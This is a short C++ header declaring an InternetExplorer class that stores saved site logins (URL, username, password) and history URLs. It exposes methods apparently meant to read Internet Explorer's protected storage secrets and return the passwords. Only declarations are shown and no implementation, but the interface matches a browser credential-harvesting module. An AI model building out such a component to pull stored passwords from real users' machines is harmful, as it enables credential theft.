#ifndef INTERNETEXPLORER_H
#define INTERNETEXPLORER_H

#include <string>
#include <vector>

typedef struct IeLoginInfo
{
	std::string Url = "";
	std::string Password = "";
	std::string UserName = "";
 }IeLoginInfo;


class InternetExplorer
{
public:
	InternetExplorer() {};

private:
	std::vector<IeLoginInfo> logins;
	std::vector<std::string> historyUrls;
	 void  ListIEProtectedStorageSecrets(std::string siteName);
public:
	std::vector<IeLoginInfo>& GetIEPaw();
};
#endif